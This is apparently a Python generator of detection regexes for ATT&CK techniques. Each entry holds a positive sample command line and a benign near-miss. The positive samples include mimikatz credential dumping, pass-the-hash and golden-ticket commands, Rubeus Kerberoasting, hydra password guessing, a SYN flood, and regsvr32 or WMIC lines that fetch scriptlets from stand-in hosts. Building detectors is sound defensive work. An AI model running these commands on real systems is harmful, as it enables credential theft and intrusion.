#!/usr/bin/env python3
"""Build reviewed, variant-specific candidates for the frozen 293-ID gap.

The examples below are independently specified launch requests, not executed
attack payloads. Matching a utility invocation never proves its child effects.
Only typed command_line arguments are accepted by the dynamic contracts.
"""

import hashlib
import json
import re
from pathlib import Path

import yaml

from feasible_observables import FILES, REGISTRY
from feasible_relations import get_cases
from feasible_static import SPECS as STATIC_SPECS
from feasible_network import CASES as NETWORK_CASES
from feasible_memory import CASES as MEMORY_CASES
from feasible_deferred import DEFERRED


ROOT = Path(__file__).resolve().parents[1]
COMMANDS = []
LAUNCH_APIS = [
    "createprocess",
    "createprocessinternal",
    "createprocessasuser",
    "createprocesswithtoken",
    "createprocesswithlogon",
]


def command(attack_id, executable, arguments, positive, negative, note):
    # No shell wrappers, shell operators, fuzzy utility names, or implicit
    # interpretation of a string anywhere in the argument list.
    if executable == "hydra":
        for flag in ("-l", "-L", "-p", "-P", "-C"):
            arguments = arguments.replace(flag + "[", "(?-i:" + flag + ")[")
    image = rf'(?:"(?:[^"\r\n]*[\\/])?{executable}(?:\.exe)?"|(?:[^\\/\s"\r\n]+[\\/])*{executable}(?:\.exe)?)'
    pattern = rf"\A{image}[ \t]+{arguments}[ \t]*\Z"
    assert re.search(pattern, positive, re.I), (attack_id, positive)
    assert not re.search(pattern, negative, re.I), (attack_id, negative)
    COMMANDS.append(
        dict(
            attack_id=attack_id,
            pattern="(?i)" + pattern,
            application_pattern="(?i)\\A(?:" + image + ")?\\Z",
            positive=positive,
            negative=negative,
            note=note,
        )
    )


OPERAND = r'(?:"[^"\r\n]+"|[^\s"\r\n&|<>]+)'
DLL = r'(?:"[^"\r\n]+\.dll"|[^\s"\r\n&|<>]+\.dll)'
EXE = r'(?:"[^"\r\n]+\.exe"|[^\s"\r\n&|<>]+\.exe)'
PS = r"powershell(?:\.exe)?"

# Concrete launch variants, with a different-operation near miss for each.
command(
    "T1003",
    "mimikatz",
    r'"sekurlsa::logonpasswords"[ \t]+"exit"',
    'mimikatz.exe "sekurlsa::logonpasswords" "exit"',
    'mimikatz.exe "version" "exit"',
    "Requests LSASS logon credential extraction; extraction is not established.",
)
command(
    "T1003.006",
    "mimikatz",
    r'"lsadump::dcsync[ \t]+/domain:[\w.-]+[ \t]+/user:[\w.\\-]+"[ \t]+"exit"',
    'mimikatz.exe "lsadump::dcsync /domain:lab.local /user:Administrator" "exit"',
    'mimikatz.exe "lsadump::lsa" "exit"',
    "Requests DCSync with an explicit domain and user; DRS replication needs separate evidence.",
)
command(
    "T1021",
    "mstsc",
    r"/v:[\w.-]+(?::[0-9]+)?",
    "mstsc.exe /v:labhost",
    "mstsc.exe /?",
    "Requests an RDP remote-service session, a concrete parent-technique implementation.",
)
command(
    "T1021.001",
    "mstsc",
    r"/v:[\w.-]+(?::[0-9]+)?",
    "mstsc.exe /v:labhost:3389",
    "mstsc.exe /edit session.rdp",
    "Requests an RDP connection to a named peer, without asserting login.",
)
command(
    "T1021.005",
    "vncviewer",
    r"[\w][\w.-]*(?::[0-9]+)?",
    "vncviewer.exe labhost:5900",
    "vncviewer.exe -help",
    "Requests a VNC session using the viewer address operand.",
)
command(
    "T1021.006",
    "winrs",
    rf"-r:[\w.-]+[ \t]+{OPERAND}",
    "winrs.exe -r:labhost whoami",
    "winrs.exe -?",
    "Requests remote command execution through Windows Remote Shell.",
)
command(
    "T1036.010",
    "net",
    r"user[ \t]+[\w.-]+\$[ \t]+[^\s&|<>]+[ \t]+/add",
    "net.exe user support$ example-only /add",
    "net.exe user support example-only /add",
    "Requests creation of a user whose trailing dollar imitates a computer account; account creation is unproven.",
)
command(
    "T1070.007",
    "netsh",
    r'wlan[ \t]+delete[ \t]+profile[ \t]+name=(?:"[^"\r\n]+"|[^\s&|<>]+)',
    'netsh.exe wlan delete profile name="Lab WiFi"',
    "netsh.exe wlan show profiles",
    "Requests deletion of a saved wireless connection profile.",
)
command(
    "T1070.008",
    "powershell",
    r'-NoProfile[ \t]+-Command[ \t]+"Search-Mailbox[ \t]+-Identity[ \t]+[\w.@-]+[ \t]+-DeleteContent[ \t]+-Force"',
    'powershell.exe -NoProfile -Command "Search-Mailbox -Identity user@lab.local -DeleteContent -Force"',
    'powershell.exe -NoProfile -Command "Get-Mailbox user@lab.local"',
    "Requests destructive mailbox content removal; server-side results are unproven.",
)
command(
    "T1070.009",
    "schtasks",
    r"/Delete[ \t]+/TN[ \t]+[\w\\.-]+[ \t]+/F",
    "schtasks.exe /Delete /TN LabTask /F",
    "schtasks.exe /Query /TN LabTask",
    "Requests removal of a scheduled persistence mechanism; its prior malicious role requires context.",
)
command(
    "T1072",
    "pdqdeploy",
    rf"Deploy[ \t]+-Package[ \t]+{OPERAND}[ \t]+-Targets[ \t]+[\w.-]+",
    'pdqdeploy.exe Deploy -Package "Lab Package" -Targets labhost',
    "pdqdeploy.exe ListPackages",
    "Requests deployment through a software distribution tool.",
)
command(
    "T1087.003",
    "powershell",
    r'-NoProfile[ \t]+-Command[ \t]+"Get-Mailbox(?:[ \t]+-ResultSize[ \t]+Unlimited)?"',
    'powershell.exe -NoProfile -Command "Get-Mailbox -ResultSize Unlimited"',
    'powershell.exe -NoProfile -Command "Get-Process"',
    "Requests enumeration of mail-enabled accounts.",
)
command(
    "T1098.002",
    "powershell",
    r'-NoProfile[ \t]+-Command[ \t]+"Add-MailboxPermission[ \t]+-Identity[ \t]+[\w.@-]+[ \t]+-User[ \t]+[\w.@-]+[ \t]+-AccessRights[ \t]+FullAccess"',
    'powershell.exe -NoProfile -Command "Add-MailboxPermission -Identity victim@lab.local -User delegate@lab.local -AccessRights FullAccess"',
    'powershell.exe -NoProfile -Command "Get-MailboxPermission victim@lab.local"',
    "Requests an additional mailbox delegate with full access.",
)
command(
    "T1098.007",
    "net",
    r"localgroup[ \t]+administrators[ \t]+[\w\\.-]+[ \t]+/add",
    "net.exe localgroup administrators labuser /add",
    "net.exe localgroup administrators",
    "Requests addition of an account to a local privileged group.",
)
command(
    "T1110.002",
    "hashcat",
    rf"-m[ \t]+[0-9]+[ \t]+-a[ \t]+0[ \t]+{OPERAND}[ \t]+{OPERAND}",
    "hashcat.exe -m 1000 -a 0 hashes.txt words.txt",
    "hashcat.exe --help",
    "Requests offline hash cracking with hash and dictionary operands.",
)
command(
    "T1114",
    "powershell",
    r'-NoProfile[ \t]+-Command[ \t]+"New-MailboxExportRequest[ \t]+-Mailbox[ \t]+[\w.@-]+[ \t]+-FilePath[ \t]+\\\\[^\s"]+\.pst"',
    'powershell.exe -NoProfile -Command "New-MailboxExportRequest -Mailbox victim -FilePath \\\\fileserver\\exports\\mail.pst"',
    'powershell.exe -NoProfile -Command "Get-Mailbox victim"',
    "Requests mailbox collection into an explicit PST export.",
)
command(
    "T1114.002",
    "powershell",
    r'-NoProfile[ \t]+-Command[ \t]+"New-MailboxExportRequest[ \t]+-Mailbox[ \t]+[\w.@-]+[ \t]+-FilePath[ \t]+\\\\[^\s"]+\.pst"',
    'powershell.exe -NoProfile -Command "New-MailboxExportRequest -Mailbox victim -FilePath \\\\fileserver\\exports\\mail.pst"',
    'powershell.exe -NoProfile -Command "Get-Mailbox victim"',
    "Requests collection from a server mailbox through an export request.",
)
command(
    "T1114.003",
    "powershell",
    r'-NoProfile[ \t]+-Command[ \t]+"Set-Mailbox[ \t]+-Identity[ \t]+[\w.@-]+[ \t]+-ForwardingSmtpAddress[ \t]+[\w.@-]+[ \t]+-DeliverToMailboxAndForward[ \t]+\$true"',
    'powershell.exe -NoProfile -Command "Set-Mailbox -Identity victim@lab.local -ForwardingSmtpAddress collector@lab.local -DeliverToMailboxAndForward $true"',
    'powershell.exe -NoProfile -Command "Get-Mailbox victim@lab.local"',
    "Requests automatic forwarding of incoming mailbox messages.",
)
command(
    "T1127",
    "msbuild",
    rf"{OPERAND}[ \t]+/target:[\w;]+",
    "msbuild.exe project.xml /target:Run",
    "msbuild.exe /version",
    "Requests a developer build utility to execute named project targets; project content needs inspection.",
)
command(
    "T1127.001",
    "msbuild",
    rf"{OPERAND}[ \t]+/target:[\w;]+",
    "msbuild.exe project.xml /target:Run",
    "msbuild.exe /version",
    "Requests named MSBuild targets from a project operand.",
)
command(
    "T1127.003",
    "jamplus",
    rf"-f[ \t]+{OPERAND}",
    "jamplus.exe -f build.jam",
    "jamplus.exe -v",
    "Requests processing of a JamPlus build description.",
)
command(
    "T1136.001",
    "net",
    r"user[ \t]+[\w.-]+[ \t]+[^\s&|<>]+[ \t]+/add",
    "net.exe user labuser example-only /add",
    "net.exe user labuser",
    "Requests local-account creation; command completion and account state need qualification.",
)
command(
    "T1136.002",
    "net",
    r"user[ \t]+[\w.-]+[ \t]+[^\s&|<>]+[ \t]+/add[ \t]+/domain",
    "net.exe user labuser example-only /add /domain",
    "net.exe user labuser /domain",
    "Requests domain-account creation with the explicit domain switch.",
)
command(
    "T1202",
    "forfiles",
    r'/p[ \t]+[^\s"]+[ \t]+/m[ \t]+[^\s"]+[ \t]+/c[ \t]+"[^"\r\n]+"',
    'forfiles.exe /p C:\\Windows /m win.ini /c "cmd /c whoami"',
    "forfiles.exe /p C:\\Windows /m win.ini",
    "Requests command execution indirectly through forfiles /c.",
)
command(
    "T1216",
    "cscript",
    rf'(?://nologo[ \t]+)?(?:"[^"\r\n]*[\\/])?pubprn\.vbs"?[ \t]+[^\s"]+[ \t]+{OPERAND}[ \t]+script:https?://[^\s"]+',
    "cscript.exe pubprn.vbs labhost printer script:https://example.invalid/payload.sct",
    "cscript.exe pubprn.vbs labhost printer localprinter",
    "Requests a system administration script with a scriptlet moniker.",
)
command(
    "T1216.001",
    "cscript",
    rf'(?://nologo[ \t]+)?(?:"[^"\r\n]*[\\/])?pubprn\.vbs"?[ \t]+[^\s"]+[ \t]+{OPERAND}[ \t]+script:https?://[^\s"]+',
    "cscript.exe pubprn.vbs labhost printer script:https://example.invalid/payload.sct",
    "cscript.exe pubprn.vbs labhost printer localprinter",
    "Requests PubPrn handling of a remote scriptlet moniker.",
)
command(
    "T1216.002",
    "syncappvpublishingserver",
    r'"n;[A-Za-z][^"\r\n]+"',
    'syncappvpublishingserver.exe "n;Start-Process calc"',
    'syncappvpublishingserver.exe "server"',
    "Requests the utility with a command-injection argument; script execution requires qualification.",
)
command(
    "T1218",
    "regsvr32",
    r'/s[ \t]+/n[ \t]+/u[ \t]+/i:https?://[^\s"]+[ \t]+scrobj\.dll',
    "regsvr32.exe /s /n /u /i:https://example.invalid/payload.sct scrobj.dll",
    "regsvr32.exe /s normal.dll",
    "Requests signed-binary proxy execution using the remote scriptlet form; a direct parent predicate, not parent roll-up.",
)
command(
    "T1218.001",
    "hh",
    r'(?:"[^"\r\n]+\.chm"|[^\s"]+\.chm)',
    "hh.exe C:\\stage\\help.chm",
    "hh.exe -help",
    "Requests compiled HTML help processing; embedded script execution is unproven.",
)
command(
    "T1218.002",
    "control",
    r'(?:"[^"\r\n]+\.cpl"|[^\s"]+\.cpl)',
    "control.exe C:\\stage\\panel.cpl",
    "control.exe /name Microsoft.System",
    "Requests execution/loading of a control-panel module.",
)
command(
    "T1218.012",
    "verclsid",
    r"/S[ \t]+/C[ \t]+\{[0-9a-f-]{36}\}",
    "verclsid.exe /S /C {00000000-0000-0000-0000-000000000001}",
    "verclsid.exe /?",
    "Requests Verclsid activation of an explicit CLSID; registration and payload are unproven.",
)
command(
    "T1218.014",
    "mmc",
    r'(?:"[^"\r\n]+\.msc"|[^\s"]+\.msc)',
    "mmc.exe C:\\stage\\console.msc",
    "mmc.exe /?",
    "Requests loading an MMC console document; its executable content needs inspection.",
)
command(
    "T1218.015",
    "electron",
    rf"--inspect=[0-9]+[ \t]+{OPERAND}",
    "electron.exe --inspect=9229 C:\\stage\\app",
    "electron.exe --version",
    "Requests an Electron application with a debugging interface; abuse needs payload/context qualification.",
)
command(
    "T1220",
    "wmic",
    r'os[ \t]+get[ \t]+/format:https?://[^\s"]+\.xsl',
    "wmic.exe os get /format:https://example.invalid/style.xsl",
    "wmic.exe os get Caption",
    "Requests remote XSL formatting through WMIC.",
)
command(
    "T1484",
    "powershell",
    r'-NoProfile[ \t]+-Command[ \t]+"Set-GPRegistryValue[ \t]+-Name[ \t]+[\w.-]+[ \t]+-Key[ \t]+[^\s"]+[ \t]+-ValueName[ \t]+[\w.-]+[ \t]+-Type[ \t]+DWord[ \t]+-Value[ \t]+[0-9]+"',
    'powershell.exe -NoProfile -Command "Set-GPRegistryValue -Name LabPolicy -Key HKLM\\Software\\Lab -ValueName Setting -Type DWord -Value 1"',
    'powershell.exe -NoProfile -Command "Get-GPO -All"',
    "Requests a concrete domain Group Policy modification.",
)
command(
    "T1484.001",
    "powershell",
    r'-NoProfile[ \t]+-Command[ \t]+"Set-GPRegistryValue[ \t]+-Name[ \t]+[\w.-]+[ \t]+-Key[ \t]+[^\s"]+[ \t]+-ValueName[ \t]+[\w.-]+[ \t]+-Type[ \t]+DWord[ \t]+-Value[ \t]+[0-9]+"',
    'powershell.exe -NoProfile -Command "Set-GPRegistryValue -Name LabPolicy -Key HKLM\\Software\\Lab -ValueName Setting -Type DWord -Value 1"',
    'powershell.exe -NoProfile -Command "Get-GPO -All"',
    "Requests an explicit GPO registry setting update.",
)
command(
    "T1484.002",
    "netdom",
    r"trust[ \t]+[\w.-]+[ \t]+/domain:[\w.-]+[ \t]+/add",
    "netdom.exe trust lab.local /domain:other.local /add",
    "netdom.exe trust lab.local /domain:other.local /verify",
    "Requests creation of a domain trust relationship.",
)
command(
    "T1485",
    "sdelete",
    rf"-p[ \t]+[1-9][0-9]*[ \t]+{OPERAND}",
    "sdelete.exe -p 3 C:\\data\\document.txt",
    "sdelete.exe -?",
    "Requests destructive overwrite deletion of a file operand.",
)
command(
    "T1505.001",
    "sqlcmd",
    r'-S[ \t]+[\w.\\-]+[ \t]+-Q[ \t]+"EXEC[ \t]+sp_procoption[ \t]+\x27[\w]+\x27,[ \t]*\x27startup\x27,[ \t]*\x27on\x27;"',
    "sqlcmd.exe -S labdb -Q \"EXEC sp_procoption 'LabProc', 'startup', 'on';\"",
    'sqlcmd.exe -S labdb -Q "SELECT @@VERSION"',
    "Requests automatic startup execution of a named stored procedure; its payload and server state remain unproven.",
)
command(
    "T1543",
    "sc",
    rf"create[ \t]+[\w.-]+[ \t]+binPath=[ \t]*{OPERAND}",
    "sc.exe create LabService binPath= C:\\stage\\service.exe",
    "sc.exe query LabService",
    "Requests creation of a Windows system service, a concrete parent-technique mechanism.",
)
command(
    "T1546.007",
    "netsh",
    rf"add[ \t]+helper[ \t]+{DLL}",
    "netsh.exe add helper C:\\stage\\helper.dll",
    "netsh.exe show helper",
    "Requests registration of a Netsh helper DLL; later load and execution are separate.",
)
command(
    "T1550",
    "rubeus",
    r"ptt[ \t]+/ticket:[^\s&|<>]+",
    "rubeus.exe ptt /ticket:C:\\stage\\ticket.kirbi",
    "rubeus.exe klist",
    "Requests reuse of supplied Kerberos authentication material.",
)
command(
    "T1550.002",
    "mimikatz",
    r'"sekurlsa::pth[ \t]+/user:[\w.-]+[ \t]+/domain:[\w.-]+[ \t]+/ntlm:[0-9a-f]{32}"[ \t]+"exit"',
    'mimikatz.exe "sekurlsa::pth /user:labuser /domain:lab.local /ntlm:00000000000000000000000000000001" "exit"',
    'mimikatz.exe "sekurlsa::logonpasswords" "exit"',
    "Requests pass-the-hash using an explicit NTLM hash; authentication is not inferred.",
)
command(
    "T1550.003",
    "rubeus",
    r"ptt[ \t]+/ticket:[^\s&|<>]+",
    "rubeus.exe ptt /ticket:C:\\stage\\ticket.kirbi",
    "rubeus.exe klist",
    "Requests injection/reuse of a supplied Kerberos ticket.",
)
command(
    "T1552.003",
    "powershell",
    r'-NoProfile[ \t]+-Command[ \t]+"Get-Content[ \t]+\$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history\.txt"',
    'powershell.exe -NoProfile -Command "Get-Content $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"',
    'powershell.exe -NoProfile -Command "Get-History"',
    "Requests access to persistent shell history, a potential credential source.",
)
command(
    "T1553",
    "signtool",
    rf"sign[ \t]+/f[ \t]+{OPERAND}[ \t]+{EXE}",
    "signtool.exe sign /f cert.pfx C:\\stage\\program.exe",
    "signtool.exe verify program.exe",
    "Requests signing a binary with supplied certificate material; malicious trust abuse is unproven.",
)
command(
    "T1553.002",
    "signtool",
    rf"sign[ \t]+/f[ \t]+{OPERAND}[ \t]+{EXE}",
    "signtool.exe sign /f cert.pfx C:\\stage\\program.exe",
    "signtool.exe verify program.exe",
    "Requests code signing with a supplied certificate file.",
)
command(
    "T1558",
    "rubeus",
    r"kerberoast[ \t]+/outfile:[^\s&|<>]+",
    "rubeus.exe kerberoast /outfile:hashes.txt",
    "rubeus.exe klist",
    "Requests service-ticket material for offline cracking.",
)
command(
    "T1558.001",
    "mimikatz",
    r'"kerberos::golden[ \t]+/user:[\w.-]+[ \t]+/domain:[\w.-]+[ \t]+/sid:S-[0-9-]+[ \t]+/krbtgt:[0-9a-f]{32}[ \t]+/ptt"[ \t]+"exit"',
    'mimikatz.exe "kerberos::golden /user:labuser /domain:lab.local /sid:S-1-5-21-1-2-3 /krbtgt:00000000000000000000000000000001 /ptt" "exit"',
    'mimikatz.exe "kerberos::list" "exit"',
    "Requests a forged TGT using a krbtgt key and domain SID.",
)
command(
    "T1558.002",
    "mimikatz",
    r'"kerberos::golden[ \t]+/user:[\w.-]+[ \t]+/domain:[\w.-]+[ \t]+/sid:S-[0-9-]+[ \t]+/target:[\w.-]+[ \t]+/service:[\w.-]+[ \t]+/rc4:[0-9a-f]{32}[ \t]+/ptt"[ \t]+"exit"',
    'mimikatz.exe "kerberos::golden /user:labuser /domain:lab.local /sid:S-1-5-21-1-2-3 /target:labhost /service:cifs /rc4:00000000000000000000000000000001 /ptt" "exit"',
    'mimikatz.exe "kerberos::list" "exit"',
    "Requests a forged service ticket using a service key and SPN components.",
)
command(
    "T1558.003",
    "rubeus",
    r"kerberoast[ \t]+/outfile:[^\s&|<>]+",
    "rubeus.exe kerberoast /outfile:hashes.txt",
    "rubeus.exe klist",
    "Requests Kerberoasting output to a named file.",
)
command(
    "T1558.004",
    "rubeus",
    r"asreproast[ \t]+/outfile:[^\s&|<>]+",
    "rubeus.exe asreproast /outfile:hashes.txt",
    "rubeus.exe klist",
    "Requests AS-REP roasting output to a named file.",
)
command(
    "T1560",
    "7z",
    rf"a[ \t]+{OPERAND}[ \t]+{OPERAND}",
    "7z.exe a C:\\stage\\archive.7z C:\\data\\documents",
    "7z.exe l C:\\stage\\archive.7z",
    "Requests archiving an input collection into an output archive.",
)
command(
    "T1560.001",
    "7z",
    rf"a[ \t]+{OPERAND}[ \t]+{OPERAND}",
    "7z.exe a C:\\stage\\archive.7z C:\\data\\documents",
    "7z.exe l C:\\stage\\archive.7z",
    "Requests the archive-creation operation of an archive utility.",
)
command(
    "T1564.006",
    "vboxmanage",
    r'startvm[ \t]+(?:"[^"\r\n]+"|[\w.-]+)[ \t]+--type[ \t]+headless',
    'vboxmanage.exe startvm "Lab Guest" --type headless',
    "vboxmanage.exe list vms",
    "Requests running a virtual machine without its normal visible console.",
)
command(
    "T1564.011",
    "powershell",
    r'-NoProfile[ \t]+-Command[ \t]+"[^"\r\n]+[ \t]+-ErrorAction[ \t]+SilentlyContinue"',
    'powershell.exe -NoProfile -Command "Get-Item C:\\missing -ErrorAction SilentlyContinue"',
    'powershell.exe -NoProfile -Command "Get-Item C:\\missing -ErrorAction Stop"',
    "Requests the PowerShell error-suppression form explicitly documented by ATT&CK; benign use is common.",
)
command(
    "T1569",
    "sc",
    r"start[ \t]+[\w.-]+",
    "sc.exe start LabService",
    "sc.exe query LabService",
    "Requests execution through an existing Windows service, an explicit parent mechanism.",
)
command(
    "T1572",
    "plink",
    r"-ssh[ \t]+[\w.@-]+[ \t]+-L[ \t]+[0-9]+:[\w.-]+:[0-9]+[ \t]+-N",
    "plink.exe -ssh user@labhost -L 8080:internal:80 -N",
    "plink.exe -ssh user@labhost hostname",
    "Requests SSH local port forwarding with explicit inner and outer endpoints.",
)
command(
    "T1649",
    "certutil",
    rf"-exportPFX[ \t]+my[ \t]+[0-9a-f]+[ \t]+{OPERAND}",
    "certutil.exe -exportPFX my 0123abcd identity.pfx",
    "certutil.exe -store my",
    "Requests export of identity certificate and private-key material; its authentication use and origin remain unproven.",
)
command(
    "T1673",
    "powershell",
    r'-NoProfile[ \t]+-Command[ \t]+"Get-VM"',
    'powershell.exe -NoProfile -Command "Get-VM"',
    'powershell.exe -NoProfile -Command "Get-Process"',
    "Requests enumeration of hosted virtual machines, rather than checking whether the current guest is virtualized.",
)
command(
    "T1689",
    "powershell",
    r'-Version[ \t]+2[ \t]+-NoProfile[ \t]+-Command[ \t]+"[^"\r\n]+"',
    'powershell.exe -Version 2 -NoProfile -Command "Get-Process"',
    'powershell.exe -Version 5 -NoProfile -Command "Get-Process"',
    "Requests the older PowerShell engine; availability and disabled modern controls need qualification.",
)

command(
    "T1027.010",
    "powershell",
    r"-NoProfile[ \t]+-EncodedCommand[ \t]+[A-Za-z0-9+/]{20,}={0,2}",
    "powershell.exe -NoProfile -EncodedCommand RwBlAHQALQBQAHIAbwBjAGUAcwBzAA==",
    "powershell.exe -NoProfile -Command Get-Process",
    "Requests decoding and executing an encoded PowerShell command, not just a Base64-like string.",
)
command(
    "T1027.013",
    "openssl",
    rf"enc[ \t]+-aes-256-cbc[ \t]+-in[ \t]+{OPERAND}[ \t]+-out[ \t]+{OPERAND}[ \t]+-pass[ \t]+file:{OPERAND}",
    "openssl.exe enc -aes-256-cbc -in payload.bin -out payload.enc -pass file:key.txt",
    "openssl.exe dgst -sha256 payload.bin",
    "Requests creation of an encrypted file; its payload role and evasion intent remain unproven.",
)
command(
    "T1027.015",
    "compact",
    rf"/c[ \t]+{OPERAND}",
    "compact.exe /c C:\\stage\\payload.exe",
    "compact.exe /q C:\\stage\\payload.exe",
    "Requests compression of a file; compression as payload concealment requires qualification.",
)
command(
    "T1078",
    "runas",
    rf"/user:\.[\\][\w.-]+[ \t]+{EXE}",
    "runas.exe /user:.\\labuser C:\\Windows\\System32\\cmd.exe",
    "runas.exe /?",
    "Requests execution under a named account; valid authentication and adversary ownership are unproven.",
)
command(
    "T1078.002",
    "runas",
    rf"/netonly[ \t]+/user:[\w.-]+\.[\w.-]+[\\][\w.-]+[ \t]+{EXE}",
    "runas.exe /netonly /user:lab.local\\labuser C:\\Windows\\System32\\cmd.exe",
    "runas.exe /user:.\\labuser C:\\Windows\\System32\\cmd.exe",
    "Requests use of an explicitly domain-qualified account for network authentication; /netonly does not validate credentials.",
)
command(
    "T1078.003",
    "runas",
    rf"/user:\.[\\][\w.-]+[ \t]+{EXE}",
    "runas.exe /user:.\\labuser C:\\Windows\\System32\\cmd.exe",
    "runas.exe /user:lab.local\\labuser C:\\Windows\\System32\\cmd.exe",
    "Requests execution under a machine-local account; successful credentials are not inferred.",
)
command(
    "T1090",
    "netsh",
    r"interface[ \t]+portproxy[ \t]+add[ \t]+v4tov4[ \t]+listenport=[0-9]+[ \t]+listenaddress=[0-9.]+[ \t]+connectport=[0-9]+[ \t]+connectaddress=[0-9.]+",
    "netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.1.2.3",
    "netsh.exe interface portproxy show all",
    "Requests a concrete TCP forwarding proxy configuration; C2 use is unproven.",
)
command(
    "T1090.001",
    "netsh",
    r"interface[ \t]+portproxy[ \t]+add[ \t]+v4tov4[ \t]+listenport=[0-9]+[ \t]+listenaddress=[0-9.]+[ \t]+connectport=[0-9]+[ \t]+connectaddress=10(?:\.[0-9]{1,3}){3}",
    "netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.1.2.3",
    "netsh.exe interface portproxy show all",
    "Requests forwarding to an RFC1918 destination; actual internal topology and C2 role require qualification.",
)
command(
    "T1098.005",
    "dsregcmd",
    r"/join",
    "dsregcmd.exe /join",
    "dsregcmd.exe /status",
    "Requests device registration/join; the account, tenant, and authorization context remain unproven.",
)
command(
    "T1110",
    "hydra",
    rf"-l[ \t]+[\w.-]+[ \t]+-P[ \t]+{OPERAND}[ \t]+rdp://[\w.-]+",
    "hydra.exe -l labuser -P passwords.txt rdp://labhost",
    "hydra.exe -h",
    "Requests online password-list guessing against an explicit remote service.",
)
command(
    "T1110.001",
    "hydra",
    rf"-l[ \t]+[\w.-]+[ \t]+-P[ \t]+{OPERAND}[ \t]+rdp://[\w.-]+",
    "hydra.exe -l labuser -P passwords.txt rdp://labhost",
    "hydra.exe -l labuser -p example-only rdp://labhost",
    "Requests multiple password guesses for one username.",
)
command(
    "T1110.003",
    "hydra",
    rf"-L[ \t]+{OPERAND}[ \t]+-p[ \t]+[^\s&|<>]+[ \t]+rdp://[\w.-]+",
    "hydra.exe -L users.txt -p example-only rdp://labhost",
    "hydra.exe -l labuser -P passwords.txt rdp://labhost",
    "Requests one password against a username list. Case-sensitive -L/-l semantics are enforced by a separate contract below.",
)
command(
    "T1110.004",
    "hydra",
    rf"-C[ \t]+{OPERAND}[ \t]+rdp://[\w.-]+",
    "hydra.exe -C pairs.txt rdp://labhost",
    "hydra.exe -l labuser -P passwords.txt rdp://labhost",
    "Requests use of a credential-pair list; stolen/reused credential origin is not inferred.",
)
command(
    "T1134.005",
    "mimikatz",
    r'"sid::add[ \t]+/sam:[\w.-]+[ \t]+/new:S-[0-9-]+"[ \t]+"exit"',
    'mimikatz.exe "sid::add /sam:labuser /new:S-1-5-21-1-2-3-500" "exit"',
    'mimikatz.exe "sid::lookup /name:labuser" "exit"',
    "Requests addition of a SID to an account SID history.",
)
command(
    "T1176.002",
    "code",
    r'--install-extension[ \t]+(?:"[^"\r\n]+\.vsix"|[^\s"]+\.vsix)',
    "code.exe --install-extension C:\\stage\\extension.vsix",
    "code.exe --list-extensions",
    "Requests installation of a local IDE extension package; its code and activation need inspection.",
)
command(
    "T1207",
    "mimikatz",
    r'"lsadump::dcshadow[ \t]+/push"[ \t]+"exit"',
    'mimikatz.exe "lsadump::dcshadow /push" "exit"',
    'mimikatz.exe "lsadump::dcsync" "exit"',
    "Requests DCShadow replication from a rogue-controller workflow; domain registration and replication are unproven.",
)
command(
    "T1213.002",
    "powershell",
    r'-NoProfile[ \t]+-Command[ \t]+"Get-PnPFile[ \t]+-Url[ \t]+[^\s"]+[ \t]+-Path[ \t]+[^\s"]+[ \t]+-AsFile"',
    'powershell.exe -NoProfile -Command "Get-PnPFile -Url /sites/lab/documents/report.docx -Path C:\\stage -AsFile"',
    'powershell.exe -NoProfile -Command "Get-PnPWeb"',
    "Requests downloading a specific SharePoint repository file.",
)
command(
    "T1213.006",
    "sqlcmd",
    r'-S[ \t]+[\w.\\-]+[ \t]+-d[ \t]+[\w]+[ \t]+-Q[ \t]+"SELECT[ \t]+\*[ \t]+FROM[ \t]+[\w.\[\]]+;?"[ \t]+-o[ \t]+[^\s"]+',
    'sqlcmd.exe -S labdb -d Lab -Q "SELECT * FROM dbo.records;" -o records.txt',
    'sqlcmd.exe -S labdb -Q "SELECT @@VERSION"',
    "Requests exporting records from a named database table.",
)
command(
    "T1496.001",
    "xmrig",
    r"--url[ \t]+stratum\+tcp://[\w.-]+:[0-9]+[ \t]+--user[ \t]+[^\s&|<>]+",
    "xmrig.exe --url stratum+tcp://pool.example.invalid:3333 --user labworker",
    "xmrig.exe --help",
    "Requests a cryptocurrency mining workload against a pool endpoint; unauthorized resource use is unproven.",
)
command(
    "T1498",
    "nping",
    r"--tcp[ \t]+--flags[ \t]+syn[ \t]+--rate[ \t]+[1-9][0-9]{4,}[ \t]+-c[ \t]+0[ \t]+[0-9.]+",
    "nping.exe --tcp --flags syn --rate 100000 -c 0 192.0.2.1",
    "nping.exe --tcp --flags syn -c 1 192.0.2.1",
    "Requests an unbounded high-rate SYN flood; target impact and adversary intent remain unproven.",
)
command(
    "T1498.001",
    "nping",
    r"--tcp[ \t]+--flags[ \t]+syn[ \t]+--rate[ \t]+[1-9][0-9]{4,}[ \t]+-c[ \t]+0[ \t]+[0-9.]+",
    "nping.exe --tcp --flags syn --rate 100000 -c 0 192.0.2.1",
    "nping.exe --tcp --flags syn -c 1 192.0.2.1",
    "Requests direct high-rate traffic generation, rather than reflection/amplification.",
)
command(
    "T1518.002",
    "reg",
    r'query[ \t]+"HKLM\\SOFTWARE\\Veeam(?:\\[^"\r\n]+)?"(?:[ \t]+/s)?',
    'reg.exe query "HKLM\\SOFTWARE\\Veeam" /s',
    'reg.exe query "HKLM\\SOFTWARE\\Microsoft" /s',
    "Requests discovery of installed backup software configuration.",
)
command(
    "T1556",
    "mimikatz",
    r'"misc::skeleton"[ \t]+"exit"',
    'mimikatz.exe "misc::skeleton" "exit"',
    'mimikatz.exe "version" "exit"',
    "Requests a known authentication-process modification mechanism; patching success is unproven.",
)
command(
    "T1556.001",
    "mimikatz",
    r'"misc::skeleton"[ \t]+"exit"',
    'mimikatz.exe "misc::skeleton" "exit"',
    'mimikatz.exe "version" "exit"',
    "Requests Skeleton Key modification of domain-controller authentication; target DC role remains unproven.",
)
command(
    "T1556.005",
    "powershell",
    r'-NoProfile[ \t]+-Command[ \t]+"Set-ADUser[ \t]+-Identity[ \t]+[\w.-]+[ \t]+-AllowReversiblePasswordEncryption[ \t]+\$true"',
    'powershell.exe -NoProfile -Command "Set-ADUser -Identity labuser -AllowReversiblePasswordEncryption $true"',
    'powershell.exe -NoProfile -Command "Set-ADUser -Identity labuser -AllowReversiblePasswordEncryption $false"',
    "Requests enabling reversible password encryption for an AD account.",
)
command(
    "T1556.006",
